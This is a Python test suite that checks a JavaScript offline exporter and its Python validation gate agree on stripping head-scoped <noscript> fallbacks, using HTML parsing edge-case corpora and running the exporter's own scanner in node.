    """The gate's copy of the head-fallback model must be the exporter's copy - by EXECUTION.

    The two are independent implementations on purpose (one runs in a browser, one in Python), and
    an exporter that strips what the gate blesses - or a gate that rejects a file the exporter left
    byte-identical - is the self-contradiction the offline parity work exists to remove. So the
    shared SETS are pinned by text and the SCANNERS are pinned by running the exporter's own source
    in node over a shared corpus: a set comparison structurally cannot see a loop that drifted, and
    the one real divergence found in review (a Python `re.IGNORECASE` folding `s` onto U+017F where
    a JS `/i` never does) passed the set comparison green.
    """

    # `(html, promotions)` - what `_stripOfflineHeadNoscript` / `offline_head_noscript_promotions`
    # must both report. Every verdict that turns on a parsing subtlety was MEASURED in a real
    # chromium `DOMParser` first (which is the parse that does the promoting), not read off the
    # spec. The one row that is a MODEL rather than a measurement is the leading BOM: a browser
    # drops it when it DECODES a file, but `DOMParser` takes a string and reads it as content, so
    # the row records the reviewer's own file load, which is what the gate is judging.
    _DOC_CORPUS = (
        ("<html><head><title>t</title><noscript><script>window.x=1</script></noscript></head>"
         "<body>b</body></html>", 1),
        # What the mode allows stays inside the fallback under both readings: content, not a
        # promotion.
        ('<html><head><noscript><!-- n --><meta name="x" content="y">'
         '<link rel="stylesheet" href="f.css"><style>p{color:red}</style></noscript></head>'
         "<body>b</body></html>", 0),
        # A BODY fallback is transparent to a scripting-disabled parse - nothing is promoted out.
        ("<html><head><title>t</title></head><body><noscript><script>window.x=1</script>"
         "</noscript></body></html>", 0),
        # A `<template>`'s content is parsed in its own fragment and never reaches the mode, and a
        # real head fallback AFTER one must still be found.
        ("<html><head><template><noscript><script>window.x=1</script></noscript></template>"
         "<noscript><script>window.y=1</script></noscript></head><body>b</body></html>", 1),
        # An explicit `</head>`, and `</br>` (which "in head" routes to anything else), both leave
        # the head, so a fallback after one is BODY content.
        ("<html><head><title>t</title></head><noscript><script>window.x=1</script></noscript>"
         "</html>", 0),
        ("<html><head><title>t</title></br><noscript><script>window.x=1</script></noscript>"
         "</html>", 0),
        # Character data as the PARSER reads it: a whitespace character reference and a U+0000 are
        # not content, so the head runs on and the fallback after them is still head-scoped.
        ("<html><head><title>t</title>&Tab;<noscript><script>window.x=1</script></noscript>"
         "</head><body>b</body></html>", 1),
        ("<html><head><title>t</title>\x00<noscript><script>window.x=1</script></noscript>"
         "</head><body>b</body></html>", 1),
        ("<html><head><title>t</title>text<noscript><script>window.x=1</script></noscript>"
         "</head><body>b</body></html>", 0),
        # The same two INSIDE a fallback body leave it standing.
        ("<html><head><noscript>&#x20;&#9;\x00<meta charset=utf-8></noscript></head>"
         "<body>b</body></html>", 0),
        # ... but `&#320;` is U+0140, not a space followed by a zero.
        ("<html><head><noscript>&#320;<meta charset=utf-8></noscript></head><body>b</body></html>",
         1),
        # A fallback that never closes (or whose end tag is truncated) is popped and promoted by the
        # scripting-disabled parse just the same, so it may not fail open.
        ("<html><head><noscript><script>window.x=1</script>", 1),
        ("<html><head><noscript><script>window.x=1</script></noscript", 1),
        # A close tag whose name is a Unicode look-alike closes nothing in a browser - the fallback
        # runs on unterminated. This is the divergence a set comparison could not see.
        ("<html><head><noscript></no\u017Fcript><script>window.x=1</script></noscript></head>"
         "<body>b</body></html>", 1),
        ("<html><head><noscript><p>js off</p></no\u017Fcript></head><body>b</body></html>", 1),
        # `</head>` inside a script body is TEXT, so the head runs on to the real fallback.
        ("<html><head><script>var s = '</head>';</script><noscript><script>window.x=1</script>"
         "</noscript></head><body>b</body></html>", 1),
        # A leading BOM is dropped when a browser DECODES the file, so a real load runs on past it.
        # (`DOMParser` takes a string and does not decode, so it alone reads one as content.)
        ("\ufeff<html><head><noscript><script>window.x=1</script></noscript></head>"
         "<body>b</body></html>", 1),
        # Two promoting fallbacks around a kept one: every cut lands on an element boundary.
        ("<html><head><noscript><p>a</p></noscript><noscript><meta charset=utf-8></noscript>"
         "<noscript><script>window.x=1</script></noscript></head><body>b</body></html>", 2),
        # A `<template>` fallback, a BOM and a whitespace-reference run composed: the template depth
        # must not consume the head scope the BOM skip and the char-data rule then run in.
        ("\ufeff<html><head><template><noscript><script>window.x=1</script></noscript></template>"
         "&#x20;\x00<noscript><script>window.y=1</script></noscript></head><body>b</body></html>", 1),
        # A `<head>` start tag inside a fallback pops it in a real chromium, whatever the spec says;
        # a nested `<noscript>` does not, and deleting that fallback would be content loss.
        ("<html><head><noscript><head><meta charset=utf-8></noscript></head><body>b</body></html>", 1),
        ("<html><head><noscript><noscript><meta charset=utf-8></noscript></head>"
         "<body>b</body></html>", 0),
        # A name only `toLowerCase`/`lower` reads as an allowed element pops the fallback in a real
        # browser, so an ASCII-only fold is what keeps the promotion visible.
        ("<html><head><noscript><lin\u212A rel=x></noscript></head><body>b</body></html>", 1),
        ("<html><head></head><body>b</body></html>", 0),
        ("", 0),
    )

    # A single pass is not a fixed point: removing a fallback splices the bytes on either side
    # together, and that can put a LATER fallback in head scope the walk had already stopped short
    # of. Each row is `(html, first_pass_drops, stable_drops)`; the gate reports the FIRST-pass
    # number (it judges the document in front of it) while the exporter runs to the stable one.
    _FIXED_POINT_CORPUS = (
        # `&#9` + a cut + `;` fuse into a whitespace reference, so the head runs on to the second
        # fallback. Measured: the once-stripped document parses with `b=1` live in the head.
        ("<html><head>&#9<noscript><script>a=1</script></noscript>;"
         "<noscript><script>b=1</script></noscript></head><body>b</body></html>", 1, 2),
    )

    # `(body, promotes)` - the fallback-body predicate on its own, where the tokenizer states live.
    _BODY_CORPUS = (
        ("", False),
        ("   \n\t ", False),
        ("<!-- a note -->", False),
        ("<!-->", False),
        ("<!-- a --!>", False),
        ("<!DOCTYPE html>", False),
        # In HTML content `<![CDATA[` is a BOGUS COMMENT ending at the first `>`, so this whole
        # body is one comment token the mode inserts rather than pops on.
        ("<![CDATA[x]]>", False),
        # ... and one that keeps a `>` of its own ends there, leaving live markup behind it.
        ("<![CDATA[x>]]><p>a</p>", True),
        ('<link rel="stylesheet" href="f.css">', False),
        ('<meta name="x" content="y">', False),
        ("<style>.x { color: red }</style>", False),
        ('<style>p::after { content: "<p>" }</style>', False),
        ("<noframes>fallback</noframes>", False),
        ("<basefont><bgsound>", False),
        ("</span>", False),
        # The SPEC says this mode ignores a `<head>` or `<noscript>` start tag. A real chromium pops
        # the fallback on `<head>` - and the browser doing the promoting is the one that matters -
        # while it agrees with the spec on a nested `<noscript>`, where what follows stays inside.
        ("<noscript>", False),
        ("<noscript><meta charset=utf-8>", False),
        ("<head>", True),
        ("<head><meta charset=utf-8>", True),
        # ... and an `<html>` really is processed with the in-body rules and merges attributes only,
        # so what follows it stays inside the fallback.
        ('<html class="no-js"><meta charset=utf-8>', False),
        # A tag name is folded ASCII-ONLY, as HTML folds one: `lin<U+212A>` is not a `link` to a
        # browser (measured - it pops the fallback), though `String.toLowerCase`/`str.lower` both
        # read it as one.
        ("<lin\u212A rel=x>", True),
        ("<LINK REL=X>", False),
        ("</br>", True),
        ("<script>window.x=1</script>", True),
        ("<p>fallback prose</p>", True),
        ("enable JavaScript", True),
        ("< not a tag", True),
        ("<meta name='x'", True),
        ("<style>/* unclosed", True),
        # The whitespace character references, at their boundaries. A named one REQUIRES its
        # semicolon; a numeric one may omit it, but then the digits that follow belong to it, so
        # `&#320;` is U+0140 and `&#9a` is U+0009 followed by an `a` (which is content).
        ("&#320;", True),
        ("&#0320;", True),
        ("&Tab", True),
        ("&NewLine", True),
        ("&#9a", True),
        ("&#x20g", True),
        ("&#0009;&#x0020;&#X20;", False),
        ("&nbsp;", True),
        ("&Tab;&NewLine;&#9;&#10;&#12;&#13;&#32;&#x9;&#xA;&#xC;&#xD;&#x20;\x00", False),
        ("&#9&#10&#12&#13&#32", False),
    )

    def _runtime(self):
        with open(os.path.join(_paths.ASSETS, "js", "68-export-offline.js"),
                  encoding="utf-8", newline="") as fh:
            return fh.read()

    def _shareable(self):
        with open(os.path.join(_paths.ASSETS, "js", "65-export-shareable.js"),
                  encoding="utf-8", newline="") as fh:
            return fh.read()

    def _alternation(self, source, name):
        m = re.search(r"const " + name + r"\s*=\s*\n?\s*/\^\(\?:([^)]*)\)\$/", source)
        self.assertIsNotNone(m, "the runtime no longer declares %s; this parity check is stale" % name)
        return frozenset(m.group(1).split("|"))

    def _region(self, source, first, last, path):
        """The contiguous source region from `first`'s declaration to the end of `last`."""
        start = source.find(first)
        self.assertNotEqual(start, -1, "%s no longer declares %s; the parity extraction is stale"
                            % (path, first))
        end = source.find(last, start)
        self.assertNotEqual(end, -1, "%s no longer declares %s after %s; the parity extraction is "
                                     "stale" % (path, last, first))
        end = source.find("\n}", end)
        self.assertNotEqual(end, -1, "could not find the end of %s in %s" % (last, path))
        return source[start:end + 2]

    def _scanner_source(self):
        """The exporter's own head-fallback scanner, as JS source, for evaluation in node."""
        tokenizer = self._region(self._shareable(), "const _CMH_SPACE_CH = ",
                                 "function _cmhRawTextClose(", "65-export-shareable.js")
        for name in ("_cmhTagEnd", "_cmhTagName", "_cmhCommentEnd", "_cmhScriptDataClose",
                     "_CMH_RAW_TEXT"):
            self.assertIn(name, tokenizer,
                          "%s is no longer inside the extracted tokenizer region, so the parity "
                          "check would run a partial copy of the scanner" % name)
        scanner = self._region(self._runtime(), "const _OFFLINE_HEAD_NOSCRIPT_OK_RE = ",
                               "function _stripOfflineHeadNoscriptStable(", "68-export-offline.js")
        for name in ("_offlineCharDataHasContent", "_offlineHeadNoscriptPromotes",
                     "_OFFLINE_WS_CHAR_REF_RE", "_OFFLINE_COMMENT_OPEN", "_OFFLINE_NON_SPACE_RE",
                     "_OFFLINE_HEAD_ELEMENT_RE", "_offlineAsciiTagName",
                     "function _stripOfflineHeadNoscript("):
            self.assertIn(name, scanner,
                          "%s is no longer inside the extracted head-fallback region, so the "
                          "parity check would run a partial copy of the scanner" % name)
        # The region is cut at the first column-0 `}`, which is only the function's END while the
        # partials keep their functions at top level. Pin the tail explicitly so a future wrapper
        # (a namespace, an IIFE) truncates the extraction LOUDLY here rather than silently handing
        # node a partial scanner that still mentions every name above.
        self.assertIn("return { html: out, dropped: dropped };", scanner,
                      "the extracted region no longer reaches the end of "
                      "_stripOfflineHeadNoscriptStable; the parity check would run a truncated copy "
                      "of the scanner")
        return tokenizer + "\n" + scanner + "\n"

    def _run_node(self, node, script, payload, what, timeout=180):
        # Passed as a `-e` argument, so it competes with the Windows 32,767-character command-line
        # limit: fail on a budget here rather than on a truncated command later.
        self.assertLess(len(script), 20000,
                        "the extracted scanner no longer fits in a `node -e` argument; write it to "
                        "a temp file and run that instead")
        try:
            proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
                                  capture_output=True, text=True, encoding="utf-8", timeout=timeout)
        except subprocess.TimeoutExpired:
            self.fail("node did not finish %s within %ds - the scan is superlinear, which is one of "
                      "the things this guard exists to catch" % (what, timeout))
        self.assertEqual(proc.returncode, 0, "node could not evaluate %s: %s" % (what, proc.stderr))
        return json.loads(proc.stdout)

    def test_the_allowed_head_fallback_content_matches(self):
        self.assertEqual(self._alternation(self._runtime(), "_OFFLINE_HEAD_NOSCRIPT_OK_RE"),
                         resources.OFFLINE_HEAD_NOSCRIPT_OK)

    def test_the_head_element_set_matches(self):
        self.assertEqual(self._alternation(self._runtime(), "_OFFLINE_HEAD_ELEMENT_RE"),
                         resources.OFFLINE_HEAD_ELEMENTS)

    def test_the_raw_text_element_set_matches(self):
        """The third shared set, and the easiest to drift: the runtime reads it from
        `65-export-shareable.js`, which the SHAREABLE export owns, so an edit made for that export
        would silently change where this head scan finds each close tag on one side only."""
        self.assertEqual(self._alternation(self._shareable(), "_CMH_RAW_TEXT"),
                         resources.OFFLINE_RAW_TEXT_ELEMENTS)

    def test_the_validator_answers_the_shared_corpus(self):
        for html, promotions in self._DOC_CORPUS:
            with self.subTest(html=html[:60]):
                self.assertEqual(len(resources.offline_head_noscript_promotions(html)), promotions,
                                 "the gate reports the wrong number of head fallbacks for %r" % html)
        for body, promotes in self._BODY_CORPUS:
            with self.subTest(body=body[:60]):
                self.assertEqual(resources.offline_head_noscript_promotes(body), promotes,
                                 "the gate's verdict on the fallback body %r is wrong" % body)

    def _assertCutsAreWholeFallbacks(self, html, rewritten, promotions):
        """Every difference between the input and what the exporter emitted is a whole `<noscript>`.

        The oracle is a plain diff, deliberately not a second copy of the scanner: it can only say
        WHERE the bytes went, which is exactly the property the count-and-body comparison cannot
        reach. An off-by-one cut still drops the right number of fallbacks and still shortens the
        document, so nothing else in this suite would notice it.
        """
        ops = [op for op in difflib.SequenceMatcher(None, html, rewritten, autojunk=False)
               .get_opcodes() if op[0] != "equal"]
        self.assertTrue(all(op[0] == "delete" for op in ops),
                        "the exporter added or rewrote bytes in %r rather than only deleting: %r"
                        % (html, ops))
        self.assertEqual(len(ops), promotions,
                         "the exporter made %d edits to %r for %d promoting fallbacks"
                         % (len(ops), html, promotions))
        for _tag, i1, i2, _j1, _j2 in ops:
            # A deletion has a whole FAMILY of equivalent alignments when the characters on either
            # side match (`</title>[<noscript>..</noscript>]</head>` and `</title><[noscript>..
            # </noscript><]` remove the same bytes), and a diff may report any of them. Slide to the
            # leftmost, then walk right through the family: the cut is a whole fallback if ANY
            # alignment in it is.
            a, b = i1, i2
            while a > 0 and html[a - 1] == html[b - 1]:
                a -= 1
                b -= 1
            whole = False
            while True:
                cut = html[a:b]
                if cut[:9].lower() == "<noscript" and (cut.endswith(">") or b == len(html)):
                    whole = True
                    break
                if b < len(html) and html[a] == html[b]:
                    a += 1
                    b += 1
                else:
                    break
            self.assertTrue(whole,
                            "a cut in %r is not a whole `<noscript>` element in any equivalent "
                            "alignment: %r" % (html, html[i1:i2][:60]))

    def test_the_exporter_answers_the_shared_corpus_in_the_real_js_engine(self):
        """The exporter's own scanner, run in node over the corpus the gate just answered.

        Text equality of the shared sets can only prove the two agree about NAMES; the scanners are
        hand-mirrored loops, so only running one of them can prove they agree about DOCUMENTS.
        Skipped when node is absent, the way the repo's other node-gated checks degrade - CI always
        has it.
        """
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        script = (
            self._scanner_source()
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);process.stdout.write(JSON.stringify({"
            "docs:p.docs.map(h=>{const r=_stripOfflineHeadNoscript(h);"
            "return [r.dropped, r.html];}),"
            "stable:p.stable.map(h=>{const f=_stripOfflineHeadNoscript(h);"
            "const s=_stripOfflineHeadNoscriptStable(h);return [f.dropped, s.dropped, s.html];}),"
            "bodies:p.bodies.map(b=>_offlineHeadNoscriptPromotes(b))}));});"
        )
        got = self._run_node(node, script,
                             {"docs": [h for h, _ in self._DOC_CORPUS],
                              "stable": [h for h, _, _ in self._FIXED_POINT_CORPUS],
                              "bodies": [b for b, _ in self._BODY_CORPUS]},
                             "the head-fallback corpus")
        self.assertEqual(len(got["docs"]), len(self._DOC_CORPUS))
        self.assertEqual(len(got["bodies"]), len(self._BODY_CORPUS))
        for (html, promotions), (dropped, rewritten) in zip(self._DOC_CORPUS, got["docs"]):
            self.assertEqual(dropped, promotions,
                             "the REAL JS engine drops %d head fallbacks where the gate reports %d "
                             "for %r - the exporter and its own --strict gate disagree"
                             % (dropped, promotions, html))
            # The BYTES, not just the count: an off-by-one in a cut range keeps the count right and
            # the output shorter, and the gate - which returns bodies rather than ranges - could
            # never see it. Checked against an INDEPENDENT oracle (a plain diff) rather than a
            # second copy of the scanner: what a cut removes must be exactly whole `<noscript>`
            # elements, and nothing may be added or reordered.
            self._assertCutsAreWholeFallbacks(html, rewritten, promotions)
        for (html, first, stable), (js_first, js_stable, js_html) in zip(self._FIXED_POINT_CORPUS,
                                                                        got["stable"]):
            self.assertEqual(js_first, first,
                             "the first pass over %r dropped %d, not %d" % (html, js_first, first))
            self.assertEqual(js_stable, stable,
                             "running the strip to a fixed point over %r dropped %d, not %d"
                             % (html, js_stable, stable))
            self.assertEqual(resources.offline_head_noscript_promotions(js_html), [],
                             "the gate still reports a promoting head fallback in what the exporter "
                             "settled on for %r - the strip is not a fixed point" % html)
        # The same invariant over the whole document corpus: whatever the exporter emits, the gate
        # must have nothing left to report about it.
        for (html, _), (_, rewritten) in zip(self._DOC_CORPUS, got["docs"]):
            self.assertEqual(resources.offline_head_noscript_promotions(rewritten), [],
                             "the gate still reports a promoting head fallback in what the exporter "
                             "emitted for %r" % html)
        for (body, promotes), js_promotes in zip(self._BODY_CORPUS, got["bodies"]):
            self.assertEqual(js_promotes, promotes,
                             "the REAL JS engine reads the fallback body %r as %s where the gate "
                             "reads it as %s" % (body, js_promotes, promotes))


if __name__ == "__main__":
    unittest.main()
